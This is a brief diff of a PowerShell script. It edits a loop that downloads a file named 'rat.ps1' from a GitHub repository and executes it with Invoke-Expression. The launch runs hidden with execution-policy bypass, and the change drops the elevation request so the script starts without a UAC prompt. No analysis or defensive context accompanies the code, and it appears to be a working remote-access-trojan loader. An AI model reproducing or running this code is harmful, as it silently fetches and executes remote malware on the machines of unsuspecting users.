@@ -28,5 +28,5 @@ while ($true) {
     }
 } else {
             $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
-        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
 }
